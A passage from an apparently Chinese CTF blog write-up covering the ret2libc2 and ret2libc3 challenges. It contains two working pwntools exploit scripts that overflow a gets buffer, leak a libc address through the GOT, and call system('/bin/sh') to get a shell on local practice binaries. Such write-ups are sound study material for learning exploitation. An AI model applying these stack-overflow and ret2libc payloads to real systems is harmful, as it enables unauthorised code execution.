src="https://img-blog.csdnimg.cn/20190228160834983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>直接给出python的脚本，与上一个例子相同，整体不再多赘述</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0xdeadbeef</span>, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>我给出了堆栈溢出的ESP指向流程图，顺着思考容易看懂payload</p><p><img src="https://img-blog.csdnimg.cn/20190228160353314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><p><img src="https://img-blog.csdnimg.cn/20190228171912573.png" alt="img"></p><p>检查安全保护，只开启了NX</p><p><img src="https://img-blog.csdnimg.cn/20190228195219362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>IDA里查看，仍然是gets函数的堆栈溢出。</p><p>但是这里没有给system函数</p><p>也没有给定的/bin/sh</p><p>所以需要我们从libc中调用system函数</p><p><img src="https://img-blog.csdnimg.cn/20190228195812530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>根据这个知识点</p><p>写exp,涉及新的东西我仍然全部做注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.binary=<span class="string">&#x27;ret2libc3&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;ret2libc3&#x27;</span>) <span class="comment">#静态加载ELF文件</span></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>] <span class="comment">#获取指定文件的plt条目</span></span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>] <span class="comment">#获取指定文件的got条目</span></span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;_start&#x27;</span>] <span class="comment">#获取指定文件的函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak main_got addr and return main&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>,puts_plt,main,libc_start_main_got]) <span class="comment">#先使用plts_plt函数打印出main函数的在got表中的真实地址</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>]) <span class="comment">#获取main函数的真实地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_start_main_addr) <span class="comment">#获取libc</span></span><br><span class="line">libcbase = libc_start_main_addr-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>) <span class="comment">#获取libc基地址</span></span><br><span class="line">system_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>) <span class="comment">#获取system地址</span></span><br><span class="line">binsh_addr = libcbase +libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment">#获取binsh字符串地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;now get shell&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>,system_addr,<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>,binsh_addr]) <span class="comment">#这里开头‘A’的数量要具体到堆栈里调试观察，因为main函数开头先将ESP最后一位变为0即16位对齐，再减128.</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
